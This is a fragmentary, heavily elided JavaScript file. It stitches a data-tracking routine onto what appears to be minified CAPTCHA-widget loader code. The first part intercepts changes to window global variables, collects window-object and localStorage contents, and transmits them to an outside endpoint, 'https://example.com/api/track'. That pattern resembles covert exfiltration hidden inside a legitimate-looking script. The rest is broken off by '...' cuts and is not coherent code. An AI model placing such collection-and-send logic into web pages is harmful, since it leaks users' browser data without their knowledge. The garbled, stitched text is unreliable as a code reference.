...
(function () {
  ...
  function setupGlobalVariableTracker() {
    ...
    globalVars.forEach(varName => {
      ...
      Object.defineProperty(window, varName, {
        get: function () {
          return originalValues[varName];
        },
        set: function (value) {
          console.log(`Global variable changed: ${varName} from ${originalValues[varName]} to ${value}`);
  ...
  function performDiscovery() {
    const windowDiscoveries = exploreEnhancedWindowObject();
    const localStorageChanges = monitorLocalStorageChanges();
    const dataToTransmit = {
      window: windowDiscoveries,
      localStorage: localStorageChanges
    };
    if (Object.keys(dataToTransmit.window).length > 0 || Object.keys(dataToTransmit.localStorage).length > 0) {
      console.log(`Discovered changes in window or localStorage`);
      transmitData(dataToTransmit, 'https://example.com/api/track');
    } else {
  ...
  function Ge(e, r) {
    var i,
      s = (i = r.params.size) !== null && i !== void 0 ? i : "normal",
      u = r.mode;
    switch (u) {
  ...
  var Xe = function () {
    var e = function (c, t, a) {
        if (c.params.retry === ie.AUTO || a) {
          ...
          var n,
            l = a ? 0 : 1e3 * 2 + ((n = c.params["retry-interval"]) !== null && n !== void 0 ? n : 0);
      ...
      _ = function (c, t) {
        ...
        if (typeof c == "string") try {
          ...
          return;
        } else if (R(c, HTMLElement)) a = c;else {
        ...
        if (l) {
          ...
          var Ae,
            ae = (Ae = o["refresh-expired"]) !== null && Ae !== void 0 ? Ae : M.AUTO;
          if (ze(ae)) o["refresh-expired"] = ae;else {
          ...
          if (!(!le || !J)) {
            ...
            var Re,
              Dt = (Re = o["response-field"]) !== null && Re !== void 0 ? Re : !0;
            if (Dt) {
          ...
          if (!(!t.widgetId || !b.has(t.widgetId))) {
            ...
            if (!(!a || !n)) switch (t.event) {
              ...
              case "requestExtraParams":
                {
                  var re,
                    ne = document.querySelector("#".concat(a));
                  if (!ne) {
  ...
  function Yt(e) {
    ...
    var g,
      A = (g = e.getAttribute("data-response-field")) !== null && g !== void 0 ? g : "true";
  ...
  function Xt() {
    ...
    for (var i = document.querySelectorAll("script"), s = 0, u; u = i[s]; s++) if (R(u, HTMLScriptElement) && e.test(u.src)) return u;
  }
  function Qt() {
    var e = Xt();
